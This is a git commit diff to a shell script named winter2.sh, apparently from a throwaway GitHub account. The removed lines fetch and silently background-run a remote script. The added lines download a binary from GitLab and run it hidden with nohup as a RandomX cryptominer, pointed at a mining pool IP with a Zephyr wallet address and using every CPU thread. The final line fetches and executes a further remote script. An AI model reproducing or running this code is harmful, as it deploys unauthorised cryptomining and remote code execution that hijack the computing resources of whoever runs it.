935320b1834e8d39b99eeea5d107993d82a7dd26
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-16 02:29:03 +0700

    Update winter2.sh

--- winter2.sh
+++ winter2.sh
@@ -1,5 +1,3 @@
-mkdir tmp && cd tmp
-wget https://raw.githubusercontent.com/williehprnuhrxyq/geram/main/gosah.sh > /dev/null 2>&1
-chmod +x gosah.sh
-nohup ./gosah.sh  >/dev/null 2>&1 &
+wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
+nohup ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo D-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) >/dev/null 2>&1 & 
 wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winter.sh && chmod +x * && ./winter.sh
